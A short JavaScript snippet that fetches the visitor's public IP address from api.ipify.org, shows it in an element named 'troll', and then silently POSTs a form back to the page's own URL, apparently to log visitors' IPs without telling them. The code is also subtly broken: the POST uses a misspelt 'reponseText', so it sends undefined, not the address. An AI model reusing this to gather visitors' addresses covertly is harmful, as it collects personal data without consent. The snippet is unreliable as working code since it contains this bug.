var Requester = new XMLHttpRequest()
Requester.open('GET', 'https://api.ipify.org', false) 
Requester.send(null) 
document.getElementById('troll').innerHTML = Requester.responseText 
var data = new FormData()
data.append('content', Requester.reponseText)
Requester.open('POST', '', false) 
Requester.send(data)
